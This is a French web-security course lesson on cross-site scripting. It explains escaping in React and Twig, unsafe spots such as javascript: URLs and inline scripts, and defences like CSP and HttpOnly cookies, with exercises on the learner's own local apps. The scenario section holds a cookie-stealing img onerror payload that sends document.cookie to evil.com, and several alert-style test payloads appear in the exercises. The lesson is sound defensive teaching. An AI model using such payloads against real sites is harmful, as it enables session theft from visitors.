---
titre: "XSS : quand une donnée devient du HTML, et les deux outils qui t'en protègent"
parcours: "securite-web"
ordre: 4
niveau: "intermediaire"
duree: 20
date: 2026-09-09
---

## Le cours

Le *Cross-Site Scripting* est l'injection SQL du navigateur : une donnée utilisateur qui atterrit dans une page HTML et y est interprétée comme du **code** — un `<script>`, un `onerror=`, un lien `javascript:`.

**Le scénario.** Un joueur ARENA choisit le pseudo `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">`. Si la page qui affiche le classement colle ce pseudo tel quel dans le HTML, chaque visiteur exécute ce code : ses cookies partent chez l'attaquant. Sur une app avec SSO sur `.velito.fr`, c'est la session de **tout l'écosystème** qui part.

Trois variantes : **stockée** (le pseudo est en base, tous les visiteurs sont touchés — le pire cas), **réfléchie** (dans une URL que la victime clique, renvoyée par la page), **DOM** (le JavaScript de la page lit une valeur et l'injecte lui-même dans le DOM).

**Pourquoi tu n'en as pas (encore).**

- **React (tout Velito-site)** : `{fiche.titre}` dans du JSX est **échappé** automatiquement. `<` devient `&lt;`, la balise s'affiche en texte, ne s'exécute pas. C'est le comportement par défaut, et il faut faire un effort pour le contourner — l'attribut s'appelle littéralement `dangerouslySetInnerHTML`. Si tu l'utilises, tu es responsable de ce que tu y mets.
- **Twig (Venaball)** : `{{ joueur.pseudo }}` est échappé par défaut (`autoescape`). Le filtre `|raw` désactive l'échappement — c'est le `dangerouslySetInnerHTML` de Twig. Chaque `|raw` dans tes templates est un endroit à auditer.
- **`react-markdown` (cours)** : le Markdown de tes fiches est rendu en **texte**, jamais en HTML brut. Le commentaire de `fiches/[slug]/page.tsx` le dit : « rendu TEXTE sécurisé : jamais de HTML brut interprété ». Un `<script>` dans un `.md` s'afficherait tel quel. (Ici le risque est faible — tu écris les fiches — mais l'outil est configuré comme si ce n'était pas le cas, et c'est la bonne habitude.)

**Les endroits où l'échappement automatique ne suffit pas.**

1. **Les attributs `href` et `src`.** `<a href={url}>` avec `url = "javascript:alert(1)"` : React échappe les caractères HTML, mais `javascript:` n'en contient aucun. Le lien exécute du code au clic. Règle : une URL venant de l'utilisateur est validée (`new URL(u)` et vérification du protocole `http:`/`https:`) avant d'être mise dans un `href`. `extraireIdTournoiToornament` fait ce genre de contrôle sur les URL collées.
2. **`dangerouslySetInnerHTML` et `|raw`.** Si tu en as besoin (du HTML riche venant d'un éditeur), il faut un **assainisseur** (DOMPurify côté JS, HTMLPurifier côté PHP) qui ne laisse passer qu'une liste blanche de balises et d'attributs. Jamais du HTML utilisateur brut.
3. **Le JavaScript inline avec des données.** `<script>const user = "{{ user.name }}";</script>` dans un template : l'échappement HTML ne protège pas un contexte JavaScript. Un nom contenant `"; fetch(…); "` s'exécute. Solution : passer les données en JSON dans un attribut `data-*` ou un `<script type="application/json">`, et les lire depuis le JS.
4. **Le CSS inline** : `style={{ background: userValue }}` — moins courant, mais `url(javascript:…)` a existé dans de vieux navigateurs.

**Le rempart supplémentaire : la Content Security Policy.** Un en-tête HTTP qui dit au navigateur d'où le code peut venir : `Content-Security-Policy: script-src 'self'` interdit tout script inline et tout script d'un autre domaine. Même si un XSS passe, le navigateur refuse de l'exécuter. Le site vitrine Venaball a reçu une CSP `script-src 'self'` le 9 septembre. C'est la ceinture derrière les bretelles — leçon 10.

**Le cookie qui ne fuit pas : `HttpOnly`.** Un cookie de session marqué `HttpOnly` est **invisible au JavaScript** : `document.cookie` ne le contient pas. Un XSS ne peut pas le voler. Supabase Auth pose ses cookies ainsi. Ça n'empêche pas le XSS de faire des requêtes *au nom* de la victime pendant qu'elle est sur la page, mais ça empêche de partir avec la session.

## À retenir

- XSS = donnée interprétée comme HTML/JS. Stockée (pire), réfléchie, DOM.
- React et Twig échappent par défaut. `dangerouslySetInnerHTML` et `|raw` désactivent — à auditer un par un.
- L'échappement HTML ne protège pas : `href`/`src` (`javascript:`), le JS inline, le CSS inline.
- URL utilisateur → valider le protocole avant `href`. HTML riche → assainisseur à liste blanche.
- CSP `script-src 'self'` et cookies `HttpOnly` : deux remparts si le premier lâche.

## Mise en pratique

Objectif : tenter un XSS sur tes apps, le voir échouer, puis trouver les endroits où il passerait.

1. ARENA en local (compte joueur) : change ton pseudo en `<b>gras</b><img src=x onerror=alert(1)>`. Regarde le classement : le texte s'affiche **tel quel**, entre chevrons, sans gras, sans alerte. React a échappé. Remets un pseudo normal.
2. Venaball (compte staff, local) : même essai dans un champ affiché en Twig (nom d'un événement). Idem, affiché en texte. Puis `findstr /s "|raw" mabb-site\templates` : liste chaque `|raw`. Pour chacun, d'où vient la donnée ? Si c'est de l'utilisateur, c'est un XSS stocké potentiel — remplace par un assainisseur ou retire `|raw`.
3. `findstr /s "dangerouslySetInnerHTML" apps` : idem côté Next. Chaque occurrence doit avoir une justification en commentaire et une source de confiance.
4. Le `href` : dans un composant de test, `<a href={valeur}>lien</a>` avec `valeur = "javascript:alert(1)"`. Clique : l'alerte apparaît (React a laissé passer). Écris une fonction `urlSure(u: string): string | null` qui rend `null` si le protocole n'est ni `http:` ni `https:`, et utilise-la. Supprime le test.
5. Cours : dans une fiche de test, écris `<script>alert(1)</script>` en Markdown. Ouvre la page : le texte s'affiche, rien ne s'exécute. `react-markdown` a fait son travail. Supprime la fiche.
6. Vérifie tes cookies de session : F12 → Application → Cookies → colonne `HttpOnly`. Les `sb-…` doivent être cochés. Dans la console : `document.cookie` → ils n'y sont pas.

Résultat attendu : tu as vu l'échappement par défaut tenir, tu as audité tes `|raw` et `dangerouslySetInnerHTML`, et tu sais que `href` est le trou que l'échappement ne bouche pas.
